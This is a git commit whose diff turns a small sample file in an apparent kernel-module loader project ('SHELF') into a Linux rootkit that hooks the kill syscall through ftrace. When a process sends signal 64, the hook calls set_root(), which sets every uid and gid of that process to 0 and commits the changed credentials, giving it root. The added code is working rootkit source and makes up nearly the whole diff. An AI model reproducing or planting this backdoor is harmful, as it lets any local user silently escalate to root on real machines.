49819d5d36ee0efd5e887e869bc4d28762bdd5db
B Horn <b@horn.uk>
2024-08-06 19:28:10 +0100

    kill hook for root
    annoying issue where the struct is not being relocated.
    
    Signed-off-by: B Horn <b@horn.uk>

--- src/sample/src/main.c
+++ src/sample/src/main.c
@@ -1,19 +1,119 @@
+#include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
+#include <linux/version.h>
 
-long i = 0x1337;
-long j = 0;
-char uwu[] = "magic test please appear\0";
-char uwu2[] = "magictest\0";
+#include "ftrace_helper.h"
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("TheXcellerator");
+MODULE_DESCRIPTION("Giving root privileges to a process");
+MODULE_VERSION("0.02");
+
+/* After Kernel 4.17.0, the way that syscalls are handled changed
+ * to use the pt_regs struct instead of the more familiar function
+ * prototype declaration. We have to check for this, and set a
+ * variable for later on */
+#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
+#define PTREGS_SYSCALL_STUBS 1
+#endif
+
+/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
+ * declare the orig_kill and hook_kill functions differently
+ * depending on the kernel version. This is the largest barrier to 
+ * getting the rootkit to work on earlier kernel versions. The
+ * more modern way is to use the pt_regs struct. */
+#ifdef PTREGS_SYSCALL_STUBS
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
+
+/* We can only modify our own privileges, and not that of another
+ * process. Just have to wait for signal 64 (normally unused) 
+ * and then call the set_root() function. */
+asmlinkage int hook_kill(const struct pt_regs *regs)
+{
+    void set_root(void);
+
+    // pid_t pid = regs->di;
+    int sig = regs->si;
+
+    if ( sig == 64 )
+    {
+        printk(KERN_INFO "rootkit: giving root...\n");
+        set_root();
+        return 0;
+    }
+
+    return orig_kill(regs);
+
+}
+#else
+/* This is the old way of declaring a syscall hook */
+static asmlinkage long (*orig_kill)(pid_t pid, int sig);
+
+static asmlinkage int hook_kill(pid_t pid, int sig)
+{
+    void set_root(void);
+
+    if ( sig == 64 )
+    {
+        printk(KERN_INFO "rootkit: giving root...\n");
+        set_root();
+        return 0;
+    }
+
+    return orig_kill(pid, sig);
+}
+#endif
+
+/* Whatever calls this function will have it's creds struct replaced
+ * with root's */
+void set_root(void)
+{
+    /* prepare_creds returns the current credentials of the process */
+    struct cred *root;
+    root = prepare_creds();
+
+    if (root == NULL)
+        return;
+
+    /* Run through and set all the various *id's to 0 (root) */
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+
+    /* Set the cred struct that we've modified to that of the calling process */
+    commit_creds(root);
+}
+
+/* Declare the struct that ftrace needs to hook the syscall */
+static struct ftrace_hook hooks[] = {
+    {0},
+    //HOOK("__x64_sys_kill", hook_kill, &orig_kill),
+};
+
+/* Module initialization function */
+static int __init rootkit_init(void)
+{
+    /* Hook the syscall and print to the kernel buffer */
+    int err;
+    hooks[0].name = "__x64_sys_kill";
+    hooks[0].function = hook_kill;
+    hooks[0].original = &orig_kill;
+    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    if(err)
+        return err;
+
+    printk(KERN_INFO "rootkit: Loaded >:-)\n");
+
+    return 0;
+}
 
 int main(void)
 {
-    printk("%lx\n", &uwu[0]);
-    printk("%i\n", uwu2[0]);
-    i += 1;
-    j = i;
-    printk("%li\n", i);
     printk("Greetings from SHELF\n");
-    printk("%s\n", uwu);
+    rootkit_init();
     return 0;
 }
